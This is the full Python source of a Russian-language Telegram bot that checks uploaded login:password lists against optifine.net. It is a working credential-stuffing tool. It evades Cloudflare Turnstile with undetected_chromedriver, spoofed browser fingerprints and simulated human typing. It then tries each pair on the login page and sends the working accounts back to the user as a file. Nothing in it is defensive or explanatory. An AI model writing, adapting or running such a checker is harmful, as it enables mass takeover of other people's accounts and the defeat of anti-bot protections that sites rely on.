import os
import sys
import logging
import asyncio
import aiofiles
import time
import random
import subprocess
from datetime import datetime
from typing import Dict, List, Tuple

# Используем undetected_chromedriver для обхода Cloudflare
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/app/debug/bot.log')
    ]
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА! Установи BOT_TOKEN в переменных окружения")
    sys.exit(1)

ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': datetime.now()
}

# Создаем директорию для отладки
os.makedirs('/app/debug', exist_ok=True)

class OptifineChecker:
    """Проверка аккаунтов на Optifine.net с обходом Cloudflare"""
    
    def __init__(self):
        self.driver = None
        logger.info("🚀 Инициализация OptifineChecker с undetected_chromedriver...")
        self.init_driver()
    
    def init_driver(self):
        """Инициализация undetected-chromedriver с автоматическим определением версии"""
        try:
            logger.info("🔍 Определяю версию Chrome...")
            
            # Получаем версию Chrome автоматически
            try:
                chrome_version_output = subprocess.check_output(['google-chrome', '--version']).decode().strip()
                chrome_version = chrome_version_output.split(' ')[-1].split('.')[0]
                logger.info(f"✅ Обнаружена версия Chrome: {chrome_version} (полная: {chrome_version_output})")
            except Exception as e:
                chrome_version = 145  # Если не удалось определить, ставим последнюю известную
                logger.warning(f"⚠️ Не удалось определить версию Chrome, использую {chrome_version}. Ошибка: {e}")
            
            # Настройки для максимальной маскировки
            options = uc.ChromeOptions()
            
            # Основные настройки для headless режима
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--start-maximized')
            
            # Критически важно для Cloudflare
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--disable-web-security')
            options.add_argument('--allow-running-insecure-content')
            options.add_argument('--disable-features=VizDisplayCompositor')
            options.add_argument('--disable-features=IsolateOrigins')
            options.add_argument('--disable-features=site-per-process')
            
            # Языковые настройки
            options.add_argument('--lang=en-US,en;q=0.9')
            
            # Реальный User-Agent с правильной версией Chrome
            options.add_argument(f'--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36')
            
            # Отключаем лишние логи
            options.add_argument('--disable-logging')
            options.add_argument('--log-level=3')
            options.add_argument('--silent')
            
            # Игнорируем ошибки SSL
            options.add_argument('--ignore-certificate-errors')
            options.add_argument('--ignore-ssl-errors')
            
            # ВАЖНО: Настройка для работы в Railway
            options.add_argument('--remote-debugging-port=9222')
            
            # Устанавливаем DISPLAY для Xvfb
            os.environ['DISPLAY'] = ':99'
            
            # Запускаем undetected driver с правильной версией
            logger.info(f"🚀 Запускаю undetected_chromedriver с версией Chrome {chrome_version}...")
            
            self.driver = uc.Chrome(
                options=options,
                version_main=int(chrome_version),
                headless=True,
                user_data_dir=None,
                driver_executable_path=None
            )
            
            # Устанавливаем таймауты
            self.driver.set_page_load_timeout(60)
            self.driver.implicitly_wait(20)
            
            # Дополнительная маскировка через JavaScript
            self.driver.execute_script("""
                // Полная маскировка автоматизации
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
                Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                
                // Маскировка Chrome
                window.chrome = {runtime: {}};
                
                // Маскировка WebGL (важно для Cloudflare)
                const getParameter = WebGLRenderingContext.prototype.getParameter;
                WebGLRenderingContext.prototype.getParameter = function(parameter) {
                    if (parameter === 37445) return 'Intel Inc.';
                    if (parameter === 37446) return 'Intel Iris OpenGL Engine';
                    return getParameter(parameter);
                };
                
                // Добавляем реальные значения
                Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
                Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
                
                // Маскировка разрешения экрана
                Object.defineProperty(screen, 'width', {get: () => 1920});
                Object.defineProperty(screen, 'height', {get: () => 1080});
                Object.defineProperty(screen, 'availWidth', {get: () => 1920});
                Object.defineProperty(screen, 'availHeight', {get: () => 1040});
            """)
            
            logger.info("✅ Undetected driver успешно инициализирован")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации драйвера: {e}")
            logger.exception("Детали ошибки:")
            return False
    
    def human_like_delay(self, min_sec=1, max_sec=3):
        """Человекоподобная задержка"""
        time.sleep(random.uniform(min_sec, max_sec))
    
    def handle_cloudflare(self, timeout=180):
        """Продвинутая обработка Cloudflare Turnstile"""
        logger.info("🛡️ Начинаю обработку Cloudflare Turnstile...")
        start_time = time.time()
        
        # Ждем начальной загрузки
        time.sleep(5)
        
        while time.time() - start_time < timeout:
            try:
                page_source = self.driver.page_source
                current_url = self.driver.current_url
                page_title = self.driver.title.lower()
                
                # Проверка на успешный проход
                if 'login' in current_url and 'just a moment' not in page_title:
                    # Проверяем наличие полей ввода
                    inputs = self.driver.find_elements(By.TAG_NAME, "input")
                    visible_inputs = [i for i in inputs if i.is_displayed() and 
                                     i.get_attribute('type') not in ['hidden']]
                    
                    if len(visible_inputs) >= 1:
                        logger.info("✅ Cloudflare успешно пройден! Найдены поля ввода.")
                        return True
                
                # Специфичная обработка Turnstile
                if 'turnstile' in page_source.lower() or 'cf-chl-widget' in page_source:
                    logger.info("🔄 Обнаружена Turnstile капча, жду автоматического решения...")
                    
                    # Ждем автоматического решения (до 45 секунд)
                    for i in range(45):
                        time.sleep(1)
                        
                        # Проверяем наличие токена
                        token_inputs = self.driver.find_elements(By.CSS_SELECTOR, 
                            "input[name='cf-turnstile-response'], input[id*='cf-chl-widget']")
                        
                        for token in token_inputs:
                            token_value = token.get_attribute('value')
                            if token_value and len(token_value) > 10:
                                logger.info(f"✅ Turnstile токен получен через {i+1}с")
                                
                                # Пробуем найти и отправить форму
                                try:
                                    # Ищем кнопку submit
                                    submit_btn = self.driver.find_elements(By.CSS_SELECTOR, 
                                        "button[type='submit'], input[type='submit'], .ctp-button")
                                    
                                    if submit_btn and submit_btn[0].is_displayed():
                                        logger.info("🖱️ Нажимаю кнопку submit")
                                        try:
                                            submit_btn[0].click()
                                        except:
                                            self.driver.execute_script("arguments[0].click();", submit_btn[0])
                                    
                                    # Если нет кнопки, пробуем отправить форму
                                    else:
                                        forms = self.driver.find_elements(By.TAG_NAME, "form")
                                        for form in forms:
                                            if form.is_displayed():
                                                logger.info("📝 Отправляю форму")
                                                self.driver.execute_script("arguments[0].submit();", form)
                                                break
                                except Exception as e:
                                    logger.debug(f"Ошибка при отправке формы: {e}")
                                
                                time.sleep(3)
                                break
                        
                        # Если URL изменился на login - успех
                        if 'login' in self.driver.current_url and 'just a moment' not in self.driver.title.lower():
                            break
                
                # Проверка наличия iframe с капчей
                iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
                for iframe in iframes:
                    src = iframe.get_attribute('src') or ''
                    if 'challenges.cloudflare.com' in src:
                        logger.info("🔄 Найден iframe Cloudflare, пробую взаимодействовать")
                        
                        try:
                            self.driver.switch_to.frame(iframe)
                            
                            # Ищем чекбокс или кнопку
                            checkboxes = self.driver.find_elements(By.CSS_SELECTOR, 
                                "[type='checkbox'], [role='checkbox'], .cf-turnstile-checkbox, [aria-label*='checkbox']")
                            
                            for cb in checkboxes:
                                if cb.is_displayed():
                                    logger.info("🖱️ Нажимаю чекбокс в iframe")
                                    try:
                                        cb.click()
                                    except:
                                        self.driver.execute_script("arguments[0].click();", cb)
                                    time.sleep(2)
                            
                            self.driver.switch_to.default_content()
                        except Exception as e:
                            logger.debug(f"Ошибка в iframe: {e}")
                            self.driver.switch_to.default_content()
                
                # Периодическое обновление если долго висит
                elapsed = time.time() - start_time
                if elapsed > 30 and elapsed % 30 < 2:
                    logger.info("🔄 Пробую обновить страницу")
                    self.driver.refresh()
                    time.sleep(5)
                
                # Логирование прогресса
                elapsed_int = int(elapsed)
                if elapsed_int % 20 == 0:
                    logger.info(f"⏳ Ожидание Cloudflare... {elapsed_int}/{timeout} сек")
                
            except Exception as e:
                logger.debug(f"Ошибка в цикле обработки Cloudflare: {e}")
            
            time.sleep(1)
        
        # Финальная отладка при неудаче
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.driver.save_screenshot(f"/app/debug/cloudflare_failed_{timestamp}.png")
            with open(f"/app/debug/cloudflare_failed_{timestamp}.html", 'w', encoding='utf-8') as f:
                f.write(self.driver.page_source)
            logger.info(f"📸 Сохранен скриншот ошибки Cloudflare: {timestamp}")
        except:
            pass
        
        logger.warning("⚠️ Cloudflare не пройден за отведенное время")
        return False
    
    def ensure_login_page(self):
        """Убеждаемся, что мы на странице входа и Cloudflare пройден"""
        if not self.driver:
            if not self.init_driver():
                return False
        
        try:
            # Переходим на страницу входа
            logger.info("🌐 Перехожу на страницу входа...")
            self.driver.get("https://optifine.net/login")
            self.human_like_delay(5, 8)
            
            # Проходим Cloudflare
            if not self.handle_cloudflare(timeout=180):
                # Пробуем еще раз с очисткой кэша
                logger.info("🔄 Первая попытка не удалась, пробую снова...")
                self.driver.delete_all_cookies()
                self.driver.refresh()
                self.human_like_delay(5, 8)
                
                if not self.handle_cloudflare(timeout=120):
                    logger.error("❌ Не удалось пройти Cloudflare после двух попыток")
                    return False
            
            self.human_like_delay(3, 5)
            logger.info("✅ Готов к проверке аккаунтов")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка при подготовке страницы: {e}")
            return False
    
    async def check_account(self, login: str, password: str) -> Dict:
        """Проверка одного аккаунта"""
        
        logger.info(f"🔍 Начинаю проверку: {login[:20]}...")
        
        if not self.driver:
            logger.error("❌ Драйвер не инициализирован")
            return {
                'login': login,
                'status': 'error',
                'error': 'Драйвер не инициализирован'
            }
        
        try:
            # Поиск поля email/username
            email_field = None
            email_selectors = [
                "//input[@name='username']",
                "//input[@name='email']",
                "//input[@id='username']",
                "//input[@id='email']",
                "//input[@type='text']",
                "//input[@type='email']",
                "//input[contains(@class, 'form-control')]",
                "//input[@placeholder='Username']",
                "//input[@placeholder='Email']",
                "//input[@name='log']",
                "//input[@autocomplete='username']",
            ]
            
            for selector in email_selectors:
                try:
                    elements = self.driver.find_elements(By.XPATH, selector)
                    for element in elements:
                        if element.is_displayed():
                            email_field = element
                            logger.info(f"✅ Найдено поле email по селектору: {selector}")
                            break
                    if email_field:
                        break
                except:
                    continue
            
            # Если не нашли, ищем любой видимый текстовый input
            if not email_field:
                try:
                    all_inputs = self.driver.find_elements(By.TAG_NAME, "input")
                    for inp in all_inputs:
                        input_type = inp.get_attribute('type')
                        if (input_type not in ['hidden', 'submit', 'button', 'password', 'checkbox', 'radio'] 
                            and inp.is_displayed()):
                            email_field = inp
                            logger.info(f"✅ Найден первый подходящий input: type={input_type}")
                            break
                except:
                    pass
            
            if not email_field:
                logger.warning("❌ Поле email не найдено")
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Поле email не найдено'
                }
            
            # Поиск поля пароля
            password_field = None
            password_selectors = [
                "//input[@type='password']",
                "//input[@name='password']",
                "//input[@name='pass']",
                "//input[@id='password']",
                "//input[@id='pass']",
                "//input[contains(@class, 'password')]",
                "//input[@placeholder='Password']",
                "//input[@autocomplete='current-password']",
            ]
            
            for selector in password_selectors:
                try:
                    elements = self.driver.find_elements(By.XPATH, selector)
                    for element in elements:
                        if element.is_displayed():
                            password_field = element
                            logger.info(f"✅ Найдено поле пароля по селектору: {selector}")
                            break
                    if password_field:
                        break
                except:
                    continue
            
            if not password_field:
                logger.warning("❌ Поле пароля не найдено")
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Поле пароля не найдено'
                }
            
            # Поиск кнопки входа
            submit_button = None
            submit_selectors = [
                "//button[@type='submit']",
                "//input[@type='submit']",
                "//button[contains(text(), 'Login')]",
                "//button[contains(text(), 'Sign in')]",
                "//button[contains(text(), 'Log in')]",
                "//input[@value='Login']",
                "//button[contains(@class, 'btn-primary')]",
                "//*[@type='submit']",
            ]
            
            for selector in submit_selectors:
                try:
                    elements = self.driver.find_elements(By.XPATH, selector)
                    for element in elements:
                        if element.is_displayed() and element.is_enabled():
                            submit_button = element
                            logger.info(f"✅ Найдена кнопка по селектору: {selector}")
                            break
                    if submit_button:
                        break
                except:
                    continue
            
            if not submit_button:
                logger.warning("❌ Кнопка не найдена")
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Кнопка не найдена'
                }
            
            # Очищаем поля
            try:
                email_field.clear()
            except:
                pass
            
            try:
                password_field.clear()
            except:
                pass
            
            # Вводим логин
            logger.info(f"✍️ Ввожу логин: {login[:20]}...")
            for char in login:
                email_field.send_keys(char)
                time.sleep(random.uniform(0.05, 0.1))
            
            self.human_like_delay(0.5, 1)
            
            # Вводим пароль
            logger.info(f"✍️ Ввожу пароль...")
            for char in password:
                password_field.send_keys(char)
                time.sleep(random.uniform(0.05, 0.1))
            
            self.human_like_delay(0.5, 1)
            
            # Нажимаем кнопку
            logger.info("🖱️ Нажимаю кнопку входа")
            try:
                submit_button.click()
            except:
                try:
                    self.driver.execute_script("arguments[0].click();", submit_button)
                except Exception as e:
                    logger.error(f"❌ Не удалось нажать кнопку: {e}")
                    return {
                        'login': login,
                        'status': 'error',
                        'error': 'Не удалось нажать кнопку'
                    }
            
            # Ждем результат
            self.human_like_delay(8, 12)
            
            # Анализируем результат
            current_url = self.driver.current_url
            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
            
            logger.info(f"📌 URL после входа: {current_url}")
            
            # Критерии успеха
            success_indicators = [
                'downloads', 'my account', 'profile', 'dashboard', 
                'welcome', 'logout', 'log out', 'premium',
                'you are logged in', 'successfully logged'
            ]
            
            # Критерии ошибки
            error_indicators = [
                'invalid', 'incorrect', 'wrong', 'error', 
                'failed', 'not found', 'try again', 'does not exist',
                'invalid username or password'
            ]
            
            # Проверяем успешность
            if any(indicator in current_url.lower() for indicator in ['downloads', 'profile', 'account']):
                logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
                
                # Возвращаемся на страницу входа
                self.driver.get("https://optifine.net/login")
                self.human_like_delay(2, 4)
                
                return {
                    'login': login,
                    'password': password,
                    'status': 'valid'
                }
            
            if any(indicator in page_text for indicator in success_indicators):
                logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
                
                self.driver.get("https://optifine.net/login")
                self.human_like_delay(2, 4)
                
                return {
                    'login': login,
                    'password': password,
                    'status': 'valid'
                }
            
            if any(indicator in page_text for indicator in error_indicators):
                logger.info(f"❌ Неверный: {login[:20]}")
                
                self.driver.get("https://optifine.net/login")
                self.human_like_delay(2, 4)
                
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': 'Неверный логин/пароль'
                }
            
            # Если остались на странице входа
            if 'login' in current_url.lower():
                logger.info(f"❌ Остались на странице входа: {login[:20]}")
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': 'Остались на странице входа'
                }
            
            # Неопределенный результат
            logger.info(f"⚠️ Неопределенный результат для {login[:20]}")
            self.driver.get("https://optifine.net/login")
            self.human_like_delay(2, 4)
            
            return {
                'login': login,
                'status': 'invalid',
                'error': 'Неопределенный результат'
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка при проверке {login[:20]}: {e}")
            
            # Пытаемся восстановить сессию
            try:
                self.driver.get("https://optifine.net/login")
                self.human_like_delay(3, 5)
            except:
                pass
            
            return {
                'login': login,
                'status': 'error',
                'error': str(e)[:100]
            }
    
    def close(self):
        """Закрытие драйвера"""
        if self.driver:
            try:
                self.driver.quit()
                logger.info("✅ Драйвер закрыт")
            except:
                pass

# Создаем экземпляр
logger.info("🚀 Создание экземпляра OptifineChecker...")
checker = OptifineChecker()

async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отправка файлов отладки"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ **Нет доступа к отладке**")
        return
    
    try:
        if not os.path.exists('/app/debug'):
            await update.message.reply_text("📁 Папка /app/debug не найдена")
            return
        
        files = os.listdir('/app/debug')
        
        if not files:
            await update.message.reply_text("📁 Папка debug пуста")
            return
        
        files.sort(key=lambda x: os.path.getmtime(os.path.join('/app/debug', x)), reverse=True)
        
        sent_count = 0
        for file in files[:5]:
            file_path = os.path.join('/app/debug', file)
            
            if os.path.getsize(file_path) > 50 * 1024 * 1024:
                await update.message.reply_text(f"⚠️ Файл {file} слишком большой (>50MB)")
                continue
            
            try:
                with open(file_path, 'rb') as f:
                    await update.message.reply_document(
                        document=f,
                        filename=file,
                        caption=f"📁 **Debug файл:** `{file}`"
                    )
                sent_count += 1
                await asyncio.sleep(1)
            except Exception as e:
                await update.message.reply_text(f"❌ Ошибка при отправке {file}: {e}")
        
        await update.message.reply_text(
            f"✅ **Отправлено файлов:** {sent_count}\n"
            f"📁 **Всего в папке:** {len(files)}"
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ **Ошибка:** {e}")
        logger.error(f"Ошибка в debug_command: {e}")

async def process_file(file_path, update, context):
    """Обработка файла с аккаунтами"""
    
    results = {
        'valid': [],
        'invalid': [],
        'errors': []
    }
    
    msg = await update.message.reply_text(
        "🚀 **Запускаю проверку Optifine.net...**\n"
        "⏳ Пожалуйста, подождите"
    )
    
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        lines = content.strip().split('\n')
        accounts = []
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            for sep in [':', ';', '|', '\t']:
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        accounts.append((parts[0].strip(), parts[1].strip()))
                        break
        
        total = len(accounts)
        
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов в файле**")
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"🔄 **Начинаю проверку...**"
        )
        
        start_time = time.time()
        
        # Проходим Cloudflare один раз
        await msg.edit_text(
            f"🛡️ **Подготавливаю сессию...**\n"
            f"⏳ Прохожу Cloudflare защиту (до 3 минут)..."
        )
        
        if not checker.ensure_login_page():
            await msg.edit_text(
                "❌ **Не удалось пройти Cloudflare защиту**\n\n"
                "Возможные причины:\n"
                "• Слишком много запросов с вашего IP\n"
                "• Cloudflare требует ручного подтверждения\n"
                "• Проблемы с сетью\n\n"
                "Попробуйте позже или используйте /debug для анализа"
            )
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"✅ **Cloudflare пройден, начинаю проверку...**"
        )
        
        for i, (login, password) in enumerate(accounts, 1):
            if i % 5 == 0 or i == total:
                elapsed = time.time() - start_time
                await msg.edit_text(
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"✅ **Рабочих:** {len(results['valid'])}\n"
                    f"⏱ **Время:** {elapsed:.1f}с\n\n"
                    f"🔄 **Проверяю:** {login[:15]}..."
                )
            
            result = await checker.check_account(login, password)
            
            if result['status'] == 'valid':
                results['valid'].append(result)
                bot_stats['valid'] += 1
                logger.info(f"✅ РАБОЧИЙ: {login[:20]}")
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
                logger.info(f"❌ НЕРАБОЧИЙ: {login[:20]}")
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
                logger.info(f"⚠️ ОШИБКА: {login[:20]} - {result.get('error')}")
            
            bot_stats['total'] += 1
            await asyncio.sleep(2)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        if results['invalid']:
            invalid_file = f"❌_НЕРАБОЧИЕ_{len(results['invalid'])}шт_{timestamp}.txt"
            async with aiofiles.open(invalid_file, 'w', encoding='utf-8') as f:
                for acc in results['invalid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(invalid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=invalid_file,
                    caption=f"❌ **Нерабочих: {len(results['invalid'])}**"
                )
            os.remove(invalid_file)
        
        if results['errors']:
            error_file = f"⚠️_ОШИБКИ_{len(results['errors'])}шт_{timestamp}.txt"
            async with aiofiles.open(error_file, 'w', encoding='utf-8') as f:
                for acc in results['errors']:
                    await f.write(f"{acc['login']}:{acc['password']} | {acc.get('error', 'unknown')}\n")
            
            with open(error_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=error_file,
                    caption=f"⚠️ **Ошибок: {len(results['errors'])}**"
                )
            os.remove(error_file)
        
        elapsed = time.time() - start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        await update.message.reply_text(
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"📊 **Статистика:**\n"
            f"• Всего: {total}\n"
            f"• ✅ Рабочих: {len(results['valid'])}\n"
            f"• ❌ Нерабочих: {len(results['invalid'])}\n"
            f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
            f"⏱ **Время:** {minutes}м {seconds}с"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    uptime = datetime.now() - bot_stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    keyboard = [
        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 **Optifine Account Checker**\n\n"
        f"🔍 Проверяет аккаунты на optifine.net\n"
        f"📊 **Статистика:**\n"
        f"• Проверено: {bot_stats['total']}\n"
        f"• Найдено рабочих: {bot_stats['valid']}\n\n"
        f"📥 **Отправь .txt файл** с логинами и паролями\n"
        f"Формат: логин:пароль (каждый с новой строки)\n\n"
        f"🔧 **Для админов:** /debug - получить файлы отладки\n\n"
        f"⏱ **Работаю:** {hours}ч {minutes}мин",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Всего проверено: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Нерабочих: {bot_stats['invalid']}\n\n"
            f"⏱ Аптайм: {hours}ч {minutes}мин"
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **КАК ПОЛЬЗОВАТЬСЯ**\n\n"
            "1️⃣ Создай .txt файл\n"
            "2️⃣ В каждой строке: логин:пароль\n"
            "3️⃣ Отправь файл боту\n\n"
            "📌 **Пример:**\n"
            "`user@mail.com:password123`\n"
            "`player123:qwerty456`\n\n"
            "⚡️ **Результат:**\n"
            "• ✅ рабочие аккаунты\n"
            "• ❌ нерабочие аккаунты\n"
            "• ⚠️ ошибки проверки\n\n"
            "🔧 **Для админов:** /debug - получить файлы отладки"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    if doc.file_size > 10 * 1024 * 1024:
        await update.message.reply_text(f"❌ **Файл > 10 МБ**")
        return
    
    try:
        await update.message.reply_text(
            f"📥 **Файл получен:** {doc.file_name}\n"
            f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
            f"🔄 **Запускаю проверку...**"
        )
        
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

def main():
    """Запуск"""
    print("=" * 50)
    print("🚀 ЗАПУСК OPTIFINE CHECKER")
    print("=" * 50)
    print(f"📁 Директория отладки: /app/debug")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("debug", debug_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ ЗАПУЩЕН!")
    print("=" * 50)
    
    try:
        app.run_polling()
    except Exception as e:
        logger.error(f"Ошибка: {e}")
    finally:
        if checker:
            checker.close()

if __name__ == '__main__':
    main()